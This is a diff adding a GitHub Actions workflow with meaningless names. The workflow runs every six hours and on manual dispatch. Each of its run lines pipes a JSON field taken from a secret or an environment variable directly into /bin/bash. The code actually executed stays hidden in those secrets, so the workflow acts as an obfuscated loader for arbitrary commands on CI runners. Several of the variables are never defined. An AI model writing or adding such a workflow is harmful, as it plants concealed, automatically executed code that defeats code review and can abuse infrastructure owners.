@@ -1,0 +1,21 @@
+name: xiangkandaooo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangkandaooo
+        env:
+          fzwhx925: ${{ secrets.fzwhx925 }}
+        run: |
+          echo $fzwhx925 | jq -r .hidj1 | /bin/bash
+          echo $rhfsy233 | jq -r .af19 | /bin/bash
+          echo $zsy34411 | jq -r .unblz77702 | /bin/bash
+          echo $mr50192 | jq -r .x0544 | /bin/bash
+          echo $d1 | jq -r .k63801 | /bin/bash
+          echo $jkla70 | jq -r .lv7034 | /bin/bash
+
